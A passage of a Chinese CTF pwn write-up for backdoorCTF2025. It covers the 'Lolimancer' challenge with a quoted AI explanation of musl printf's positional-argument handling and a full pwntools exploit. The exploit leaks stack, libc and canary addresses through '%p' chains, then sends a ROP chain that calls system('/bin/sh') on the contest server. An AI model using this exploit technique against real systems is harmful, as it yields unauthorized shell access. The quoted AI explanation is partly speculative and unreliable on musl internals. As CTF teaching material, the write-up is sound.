</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>9</span><span class=p>,</span> <span class=mh>0xf00</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=o>=</span> <span class=n>check_gift</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>gift</span><span class=p>[</span><span class=mh>0x4c0</span><span class=p>:</span><span class=mh>0x4d0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>master_key</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=lolimancer>Lolimancer<a hidden class=anchor aria-hidden=true href=#lolimancer>#</a></h2><p>本题的特殊之处在于libc是<code>musl</code>，而不是<code>glibc</code></p><p><code>musl</code>的<code>printf</code>函数有点不同，下面给<code>gemini</code>的回答</p><p>TL;DR：<code>musl</code>的<code>printf</code>中，在使用第<code>n</code>个参数时，必须使用前<code>n-1</code>个参数，换句话说如果想要<code>''%6$p'</code>，只能<code>'%p' * 6</code>或者<code>'%1$p%2%p%3$p%4$p%5$p%6$p'</code></p><blockquote><h3 id=1-核心矛盾va_list-的单向性>1. 核心矛盾：<code>va_list</code> 的单向性<a hidden class=anchor aria-hidden=true href=#1-核心矛盾va_list-的单向性>#</a></h3><p>要理解这个漏洞的区别，必须先理解 C 语言可变参数（<code>va_list</code>）的工作原理：</p><ul><li><strong>栈是线性的：</strong> 参数在栈上（或寄存器中）是一个接一个紧挨着排放的。</li><li><strong>读取是单向的：</strong> 想要读取第 6 个参数，<strong>必须</strong>先知道第 1、2、3、4、5 个参数的大小（是 <code>int</code> 4字节？还是 <code>double</code> 8字节？），然后逐个跳过它们。你不能直接“瞬移”到第 6 个位置。</li></ul><h3 id=2-glibc-的做法宽容与猜测>2. Glibc 的做法：宽容与猜测<a hidden class=anchor aria-hidden=true href=#2-glibc-的做法宽容与猜测>#</a></h3><p><code>glibc</code> 的 <code>vfprintf</code> 非常复杂（代码量巨大），它采用了一种**“两遍扫描 + 内部缓冲”**的策略，并且带有很强的容错性。</p><ul><li><strong>机制：</strong> 当 <code>glibc</code> 看到 <code>%6$p</code> 时，它意识到使用了位置参数。</li><li><strong>填补空缺：</strong> 它会扫描整个格式化字符串。如果发现缺少第 1-5 个参数的定义，<code>glibc</code> 为了能让你拿到第 6 个，它在内部处理时通常会<strong>默认假设</strong>缺失的参数是 <code>int</code>（或字长宽度）。</li><li><strong>结果：</strong> 它通过假设跳过了前 5 个位置，成功读取了第 6 个位置的数据并打印。</li><li><strong>代价：</strong> 代码极其臃肿，且这种“猜测”在某些架构下可能不安全。</li></ul><h3 id=3-musl-的做法严格与极简>3. Musl 的做法：严格与极简<a hidden class=anchor aria-hidden=true href=#3-musl-的做法严格与极简>#</a></h3><p><code>musl</code> 的设计哲学是代码极简且严格遵循 POSIX 标准。它的 <code>vfprintf.c</code> 逻辑非常直白，正是这种直白导致了你看到的结果。</p><h4 id=源码逻辑复盘基于-musl-srcstdiovfprintfc>源码逻辑复盘（基于 musl <code>src/stdio/vfprintf.c</code>）<a hidden class=anchor aria-hidden=true href=#源码逻辑复盘基于-musl-srcstdiovfprintfc>#</a></h4><p>Musl 处理位置参数的伪代码逻辑如下：</p><p>C</p><pre tabindex=0><code>// musl vfprintf.c 的简化逻辑
int vfprintf(..., const char *fmt, va_list ap) {
    // 1. 扫描格式化字符串，构建类型表
    // nl_type[i] 存储第 i 个参数的类型
    for (...) {
        if (sees &#34;%6$p&#34;) nl_type[6] = POINTER;
    }

    // 2. 这里的 nl_type[1] 到 nl_type[5] 都是 0 (UNKNOWN)！
    
    // 3. 尝试读取参数存入本地缓存 nl_arg
    for (i = 1; i &lt;= max_arg; i++) {
        switch (nl_type[i]) {
            case INT:     nl_arg[i].i = va_arg(ap, int); break;
            case POINTER: nl_arg[i].p = va_arg(ap, void*); break;
            // ... 其他类型 ...
            case 0: 
                // !!! 致命问题 !!!
                // 标准说：如果用到了第N个参数，前N-1个必须有定义。
                // Musl 此时不知道第 i 个参数多大，无法移动 ap 指针。
                // 此时 musl 判定为非法格式，直接停止处理或报错返回。
                return -1; 
        }
    }
}
</code></pre><h4 id=为什么是未定义行为或崩溃>为什么是“未定义行为”或崩溃？<a hidden class=anchor aria-hidden=true href=#为什么是未定义行为或崩溃>#</a></h4><ol><li><strong>什么都不打印（返回 -1）：</strong> 当 <code>musl</code> 发现第 1-5 个参数类型未知时，它无法执行 <code>va_arg(ap, ???)</code> 来跳到第 6 个参数。它<strong>物理上无法</strong>计算出第 6 个参数的内存地址。因此，它通常会检测到这个“空洞（Hole）”，停止解析，并返回错误代码（通常是 -1）。如果你的程序没有检查 <code>printf</code> 的返回值，看起来就是“什么都没发生”。</li><li><strong>崩溃（Crash）：</strong> 在某些特定版本或编译优化的 <code>musl</code> 中，如果在某些极端的漏洞利用场景下（或者如果你混用了 <code>%</code> 和 <code>%n$</code>），内部的状态机可能会因为索引越界或读取了未初始化的 <code>nl_arg</code> 数组而崩溃。特别是如果它试图读取一个未被正确 <code>pop</code> 出来的指针并解引用它，程序就会立即 Segfault。</li></ol><h3 id=4-为什么-posix-标准站在-musl-这一边>4. 为什么 POSIX 标准站在 Musl 这一边？<a hidden class=anchor aria-hidden=true href=#4-为什么-posix-标准站在-musl-这一边>#</a></h3><p>POSIX 标准关于 <code>printf</code> 有明确规定：</p><blockquote><p>&ldquo;When numbered argument specifications are used, specifying the Nth argument requires that all the leading arguments, from the first to the (N-1)th, are specified in the format string.&rdquo;</p><p>（当使用编号参数说明符时，指定第 N 个参数要求从第 1 到第 N-1 个参数都必须在格式字符串中指定。）</p></blockquote><ul><li><strong>你的输入：</strong> <code>%6$p</code></li><li><strong>违规点：</strong> 缺少 1, 2, 3, 4, 5 的定义。</li><li><strong>结论：</strong> 这是一个非法的格式字符串。<code>musl</code> 拒绝服务是符合标准的；<code>glibc</code> 帮你打印出来是它自己的“私自扩展（GNU Extension）”行为。</li></ul><h3 id=5-对漏洞利用exploit的影响>5. 对漏洞利用（Exploit）的影响<a hidden class=anchor aria-hidden=true href=#5-对漏洞利用exploit的影响>#</a></h3><p>这对 CTF 或实战漏洞挖掘有巨大影响：</p><ul><li><strong>在 Glibc 上：</strong> 你可以随意泄露栈深处的内存，例如 <code>%100$p</code>，即使你不知道前 99 个参数是什么。这使得泄露 canary 或 libc基址非常容易。</li><li><strong>在 Musl 上：</strong> 格式化字符串漏洞利用难度剧增。<ul><li>你<strong>不能</strong>跳过参数。如果你想泄露第 6 个参数，你必须构造一个格式化字符串，显式地消耗掉前 5 个参数，例如： <code>%1$p%2$p%3$p%4$p%5$p%6$p</code></li><li>如果 payload 长度受限（例如缓冲区很小），你就无法构造出足够长的填充来触达深层的栈数据。</li></ul></li></ul><h3 id=1-核心罪魁祸首nl_arg-数组>1. 核心罪魁祸首：<code>nl_arg</code> 数组<a hidden class=anchor aria-hidden=true href=#1-核心罪魁祸首nl_arg-数组>#</a></h3><p>在 <code>musl</code> 的 <code>src/stdio/vfprintf.c</code> (或其调用的 <code>printf_core</code>) 中，为了处理 <code>%n$</code> 这种参数，它必须把参数从 <code>va_list</code> 拷贝到一个本地数组里方便随机访问。</p><p>关键代码定义大致如下：</p><p>C</p><pre tabindex=0><code>// 简化后的 musl 内部变量定义
union arg {
    uintmax_t i;
    double f;
    void *p;  // %n 对应的指针存在这里
};

// !!! 重点在这里 !!!
// 这个数组是在栈上分配的局部变量，且没有被初始化为0！
union arg nl_arg[NL_ARGMAX+1]; 
uint32_t nl_type[NL_ARGMAX+1] = {0}; // 类型表倒是初始化了
</code></pre><h3 id=2-崩溃流程复盘>2. 崩溃流程复盘<a hidden class=anchor aria-hidden=true href=#2-崩溃流程复盘>#</a></h3><p>当你输入 <code>%4$n</code> 且没有定义 1, 2, 3 时，发生了以下连锁反应：</p><h4 id=第一步类型扫描pass-1>第一步：类型扫描（Pass 1）<a hidden class=anchor aria-hidden=true href=#第一步类型扫描pass-1>#</a></h4><p>扫描器发现 <code>%4$n</code>，于是标记：</p><ul><li><code>nl_type[4] = POINTER;</code></li><li><code>nl_type[1]</code>, <code>nl_type[2]</code>, <code>nl_type[3]</code> 依然是初始值 <code>0</code> (也就是 <code>NONE</code>)。</li></ul><h4 id=第二步参数获取pass-2-漏洞发生地>第二步：参数获取（Pass 2）—— <strong>漏洞发生地</strong><a hidden class=anchor aria-hidden=true href=#第二步参数获取pass-2-漏洞发生地>#</a></h4><p>理论上，musl 应该在发现 nl_type[1] 为 0 时直接 return -1 报错。</p><p>但是，在某些特定的编译优化（Optimization）、特定版本或者如果程序逻辑因为其他未定义行为（Undefined Behavior）而“意外”地绕过了检查（或者仅仅是因为你的调试环境与标准源码有细微出入），程序进入了后续的执行流。</p><p>更关键的是 <code>nl_arg</code> 的状态：</p><ul><li>因为 <code>nl_arg</code> 是局部变量且未初始化，<strong>它的内存里装的是“上一层函数”栈帧遗留下来的垃圾数据</strong>。</li><li><code>musl</code> 并没有执行 <code>va_arg</code> 来填充 <code>nl_arg[4]</code>（因为之前的参数缺失，无法计算偏移）。</li><li>所以，<code>nl_arg[4].p</code> 的值，就是<strong>此刻栈上那个位置原本存在的任何数值</strong>。</li></ul><h4 id=第三步执行写入>第三步：执行写入<a hidden class=anchor aria-hidden=true href=#第三步执行写入>#</a></h4><p>当 <code>printf</code> 执行到 <code>%4$n</code> 时，它执行类似这样的操作：</p><p>C</p><pre tabindex=0><code>// 伪代码
int *ptr = nl_arg[4].p; // 取出指针
*ptr = count;           // 尝试写入字符计数
</code></pre><h3 id=3-为什么是-0x38-或-0x1000>3. 为什么是 <code>0x38</code> 或 <code>0x1000</code>？<a hidden class=anchor aria-hidden=true href=#3-为什么是-0x38-或-0x1000>#</a></h3><p>这就是最有趣的地方。因为 <code>nl_arg[4]</code> 是未初始化的栈内存，它直接继承了栈上的“脏数据”。</p><ul><li><p>0x38 (十进制 56):</p><p>这很可能是栈上残留的一个小整数。比如上一个被调用的函数中有一个循环计数器 i 增加到了 56，或者是一个结构体的偏移量，或者是某个标志位。当 vfprintf 分配栈帧时，nl_arg[4] 刚好落在了这个位置。</p><ul><li>程序试图向内存地址 <code>0x0000000000000038</code> 写入数据。这是内核保留区，不可写 -> <strong>Segmentation Fault</strong>。</li></ul></li><li><p>0x1000:</p><p>这通常是页对齐的大小。可能是上一个函数的某个缓冲区大小参数，或者是某个被 free 掉的堆块的头部残留数据。</p></li></ul><h3 id=4-glibc-vs-musl行为对比图解>4. Glibc vs Musl：行为对比图解<a hidden class=anchor aria-hidden=true href=#4-glibc-vs-musl行为对比图解>#</a></h3><p>我为你生成了一张内存行为对比图，以便更直观地理解这种差异。</p><p>google:search{queries:[musl vfprintf nl_arg uninitialized stack usage,musl printf %n crash mechanism]}</p><p><strong>对比总结：</strong></p><table><thead><tr><th><strong>行为</strong></th><th><strong>Glibc</strong></th><th><strong>Musl</strong></th></tr></thead><tbody><tr><td><strong>缺失参数处理</strong></td><td><strong>猜测并填充</strong>。它假设缺失的参数是默认宽度，强制计算出 <code>%4$</code> 的偏移量。</td><td><strong>拒绝或未定义</strong>。标准逻辑是报错，但若触发未定义行为，则使用<strong>栈残留数据</strong>。</td></tr><tr><td><strong>指针来源</strong></td><td>实际的栈/寄存器数据（即使是错位的数据，也是真实存在的地址）。</td><td><strong>本地局部变量数组 <code>nl_arg</code></strong>。</td></tr><tr><td><strong>崩溃原因</strong></td><td>通常不容易崩，除非算出的地址不可访问。</td><td><strong>极易崩</strong>。因为使用的是未初始化的“脏栈数据”，这些数据（如 <code>0x38</code>）作为指针通常是非法的。</td></tr></tbody></table></blockquote><p>所以这道题的格式化字符串漏洞</p><p><img alt=image-20251208172254986 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208172254986.png></p><p>只能通过一连串的<code>%p</code>来进行泄露</p><p>可以看到还有一个栈溢出</p><p><img alt=image-20251208172327598 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208172327598.png></p><p>泄露之后ROP即可</p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;chall&#34;</span> <span class=o>+</span> <span class=s2>&#34;_patched&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;./libc.so&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;remote.infoseciitr.in&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>8003</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>env_vars</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;LD_LIBRARY_PATH&#34;</span><span class=p>:</span> <span class=s2>&#34;.&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=n>env_vars</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=n>env_vars</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Your exploit here</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%p%p&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=n>base</span><span class=o>=</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=n>base</span><span class=o>=</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0xb5b44</span> <span class=o>+</span> <span class=mh>0x3fa0</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;stack: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>stack</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%p&#39;</span> <span class=o>*</span> <span class=mh>0x14</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;One more time and you will be strong!!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;0x7025702570257025000000x1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>18</span><span class=p>),</span> <span class=n>base</span><span class=o>=</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;canary: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>canary</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>rdi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x00000000000142a5</span>
</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>24</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>p64</span><span class=p>(</span><span class=n>stack</span> <span class=o>+</span> <span class=mh>0xd8</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>p64</span><span class=p>(</span><span class=n>binsh</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret</span> <span class=o>+</span> <span class=mi>1</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>),</span>
</span></span><span class=line><span class=cl><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1>#print(hex(rdi_ret))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;I think you do not need warmup!!&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://wgggggggg.github.io/posts/ctf/secconctf2025-writeup/><span class=title>« Prev</span><br><span>secconCTF2025 PWN Writeup'</span>
</a><a class=next href=https://wgggggggg.github.io/posts/ctf/heroctf2025-writeup/><span class=title>Next »</span><br><span>HeroCTF2025 PWN Writeup</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share backdoorCTF2025 PWN Writeup on x" href="https://x.com/intent/tweet/?text=backdoorCTF2025%20PWN%20Writeup&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share backdoorCTF2025 PWN Writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f&amp;title=backdoorCTF2025%20PWN%20Writeup&amp;summary=backdoorCTF2025%20PWN%20Writeup&amp;source=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share backdoorCTF2025 PWN Writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f&title=backdoorCTF2025%20PWN%20Writeup"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share backdoorCTF2025 PWN Writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share backdoorCTF2025 PWN Writeup on whatsapp" href="https://api.whatsapp.com/send?text=backdoorCTF2025%20PWN%20Writeup%20-%20https%3a%2f%2fwgggggggg.github.io%2fposts%2fctf%2fbackdoorctf2025-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share backdoorCTF2025 PWN Writeup on telegram" 